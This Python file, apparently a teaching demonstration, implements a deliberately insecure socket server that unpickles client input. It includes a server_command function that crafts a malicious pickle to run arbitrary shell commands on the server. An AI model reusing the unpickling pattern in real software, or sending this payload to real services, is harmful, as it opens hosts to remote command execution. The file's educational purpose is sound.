#!/usr/bin/env python3
"""Insecure server for exchanging pickled objects."""

import pickle
import socketserver
import socket
import threading


class PickleServer(socketserver.ThreadingTCPServer):
    """
    Threaded TCP server that allows clients to exchange pickled objects.

    You should call the constructor with (host, port) as the first argument,
    and with the class of the handler (PickleHandler) as the second argument.
    This class handles all synchronization necessary to access on multiple
    threads (not processes).
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.pickle_data = {}
        self.pickle_lock = threading.Lock()

    def store_pickle(self, key, value):
        """Store value in key's queue."""
        with self.pickle_lock:
            l = self.pickle_data.get(key, [])
            l.append(value)
            self.pickle_data[key] = l
            return len(l)

    def get_pickle(self, key):
        """Retrieve a value from key's queue, or None if there aren't any."""
        with self.pickle_lock:
            l = self.pickle_data.get(key, [])
            if l:
                self.pickle_data[key] = l[1:]
                return l[0]
            else:
                return None


class PickleHandler(socketserver.StreamRequestHandler):
    """Handler for PickleServer connections."""

    def handle(self):
        # This is a very bad idea >:)
        print('HANDLER: beginning handle()')
        request = pickle.load(self.rfile)
        print('HANDLER: received %r' % request)

        # Get from and to (doesn't matter what you're doing)
        id = request['id']

        # Perform action
        print('HANDLER: action is %s' % request['action'])
        if request['action'] == 'send':
            response = self.server.store_pickle(id, request['object'])
        elif request['action'] == 'receive':
            response = self.server.get_pickle(id)

        # Return the response
        print('HANDLER: response is %r' % response)
        pickle.dump(response, self.wfile)


def run_pickle_server(host="localhost", port=9999):
    """Run a pickle server forever!"""
    server = PickleServer((host, port), PickleHandler)
    server.serve_forever()


def send(obj, id, host='localhost', port=9999):
    """Send an object to a specified ID."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        w = sock.makefile('wb')
        r = sock.makefile('rb')
        pickle.dump({'action': 'send', 'object': obj, 'id': id}, w)
        w.close()
        retval = pickle.load(r)
    finally:
        sock.close()
        return retval


def recv(id, host='localhost', port=9999):
    """Receive an object with ID (returns None if none available)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        w = sock.makefile('wb')
        r = sock.makefile('rb')
        pickle.dump({'action': 'receive', 'id': id}, w)
        w.close()
        retval = pickle.load(r)
    finally:
        sock.close()
        return retval


def server_command(command, host='localhost', port=9999):
    """
    Illustrates just how insecure this server really is.

    If you pass a byte string with a shell command in it (e.g. b'ls -l'), this
    will execute it on the server.  Lessons learned: don't accept arbitrary
    input and unpickle it. (NOTE: the shell command could have quotes within
    it, but only double quotes ("), no single quotes (').)
    """
    malicious_binary = b"cos\nsystem\n(S'" + command + b"'\ntR."
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, port))
        sock.sendall(malicious_binary)
